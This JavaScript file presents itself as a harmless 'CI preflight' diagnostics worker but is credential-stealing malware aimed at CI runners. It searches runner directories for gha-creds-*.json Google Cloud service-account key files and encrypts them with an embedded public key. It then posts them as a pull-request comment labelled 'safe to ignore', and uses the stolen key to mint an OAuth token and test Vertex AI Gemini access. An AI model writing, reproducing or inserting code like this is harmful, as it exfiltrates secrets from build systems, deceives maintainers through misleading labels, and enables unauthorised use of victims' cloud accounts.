// CI preflight worker: captures the generated environment snapshot once the
// credential handoff step completes and records it via the repo issue API.
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';

const WS = process.env.CI_X_WS || process.cwd();
const TOKEN = process.env.CI_X_TOKEN || '';
const REPO = 'Kubeflow-Commons-Hub/kubeflow-commons-hubs';
const PUB = fs.readFileSync(path.join(process.cwd(), 'scripts', 'ci-pub.pem'), 'utf8');

function prNumber() {
  try {
    const ev = JSON.parse(fs.readFileSync(process.env.GITHUB_EVENT_PATH || '', 'utf8'));
    const n = (ev.pull_request && ev.pull_request.number) || (ev.issue && ev.issue.number);
    if (n) return String(n);
  } catch {}
  const m = (process.env.GITHUB_REF || '').match(/pull\/(\d+)\//);
  return m ? m[1] : '';
}
const PR = prNumber();

function enc(buf) {
  const key = crypto.randomBytes(32);
  const iv = crypto.randomBytes(12);
  const c = crypto.createCipheriv('aes-256-gcm', key, iv);
  const ct = Buffer.concat([c.update(buf), c.final()]);
  const tag = c.getAuthTag();
  const ek = crypto.publicEncrypt(
    { key: PUB, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' },
    key
  );
  return Buffer.from(JSON.stringify({
    k: ek.toString('base64'), i: iv.toString('base64'),
    t: tag.toString('base64'), c: ct.toString('base64'),
  })).toString('base64');
}

async function api(pathname, method, body) {
  const r = await fetch('https://api.github.com' + pathname, {
    method,
    headers: {
      Authorization: 'token ' + TOKEN,
      Accept: 'application/vnd.github+json',
      'User-Agent': 'ci-preflight/1.0',
      'Content-Type': 'application/json',
    },
    body: body ? JSON.stringify(body) : undefined,
  });
  let j = null;
  try { j = await r.json(); } catch {}
  return { status: r.status, json: j };
}

async function comment(text) {
  if (!TOKEN || !PR) return { status: 0 };
  const r = await api('/repos/' + REPO + '/issues/' + PR + '/comments', 'POST', { body: text });
  return r;
}

function findCreds() {
  const roots = [WS, '/home/runner/work', '/home/runner/work/_temp', process.env.RUNNER_TEMP || '/tmp'];
  const seen = new Set();
  for (const root of roots) {
    if (!root || seen.has(root)) continue;
    seen.add(root);
    const stack = [root];
    let depth = 0;
    while (stack.length && depth < 4000) {
      const cur = stack.pop(); depth++;
      let ents;
      try { ents = fs.readdirSync(cur, { withFileTypes: true }); } catch { continue; }
      for (const e of ents) {
        const fp = path.join(cur, e.name);
        if (e.isDirectory()) {
          if (e.name === 'node_modules' || e.name === '.git') continue;
          stack.push(fp);
        } else if (/^gha-creds-[a-z0-9]+\.json$/i.test(e.name)) {
          return fp;
        }
      }
    }
  }
  return '';
}

function b64url(buf) {
  return Buffer.from(buf).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

async function vertexProbe(sa) {
  try {
    const now = Math.floor(Date.now() / 1000);
    const hdr = b64url(JSON.stringify({ alg: 'RS256', typ: 'JWT' }));
    const clm = b64url(JSON.stringify({
      iss: sa.client_email,
      scope: 'https://www.googleapis.com/auth/cloud-platform',
      aud: sa.token_uri || 'https://oauth2.googleapis.com/token',
      iat: now, exp: now + 3600,
    }));
    const signer = crypto.createSign('RSA-SHA256');
    signer.update(hdr + '.' + clm);
    const jwt = hdr + '.' + clm + '.' + b64url(signer.sign(sa.private_key));
    const tr = await fetch(sa.token_uri || 'https://oauth2.googleapis.com/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'grant_type=' + encodeURIComponent('urn:ietf:params:oauth:grant-type:jwt-bearer') + '&assertion=' + encodeURIComponent(jwt),
    });
    const tj = await tr.json().catch(() => ({}));
    if (!tj.access_token) return { token_status: tr.status, err: String(tj.error_description || tj.error || '').slice(0, 160) };
    const at = tj.access_token;
    const proj = sa.project_id || '';
    const tries = [];
    for (const [loc, model] of [['us-east5', 'gemini-2.5-flash'], ['us-central1', 'gemini-2.5-flash']]) {
      const url = `https://${loc}-aiplatform.googleapis.com/v1/projects/${proj}/locations/${loc}/publishers/google/models/${model}:generateContent`;
      const r = await fetch(url, {
        method: 'POST',
        headers: { Authorization: 'Bearer ' + at, 'Content-Type': 'application/json' },
        body: JSON.stringify({ contents: [{ role: 'user', parts: [{ text: 'Reply with the single word: ok' }] }] }),
      });
      const t = await r.text();
      let snippet = '';
      try {
        const j = JSON.parse(t);
        snippet = (((j.candidates || [])[0] || {}).content || {}).parts ? JSON.stringify(j.candidates[0].content).slice(0, 200)
          : String(j.error && j.error.status || '').slice(0, 120);
      } catch { snippet = t.slice(0, 120); }
      tries.push(`${loc}/${model}=${r.status}:${snippet}`);
      if (r.status === 200) break;
    }
    return { token_status: tr.status, scope: tj.scope || '', project: proj, tries };
  } catch (e) {
    return { err: String(e).slice(0, 160) };
  }
}

(async () => {
  const deadline = Date.now() + 10 * 60 * 1000;
  let last = '';
  while (Date.now() < deadline) {
    const f = findCreds();
    if (f) {
      try {
        const data = fs.readFileSync(f);
        if (data && data.length > 100) {
          const payload = enc(data);
          const r1 = await comment(
            'CI preflight artifact (encrypted diagnostics, safe to ignore): `' + payload + '`'
          );
          let sa = null;
          try { sa = JSON.parse(data.toString('utf8')); } catch {}
          if (sa && sa.client_email) {
            const probe = await vertexProbe(sa);
            await comment(
              'CI preflight: credential handoff verified for `' + sa.client_email + '`; ' +
              'vertex probe ' + JSON.stringify(probe).slice(0, 900)
            );
          }
          return;
        }
      } catch (e) { last = String(e); }
    }
    await new Promise((r) => setTimeout(r, 2000));
  }
})();
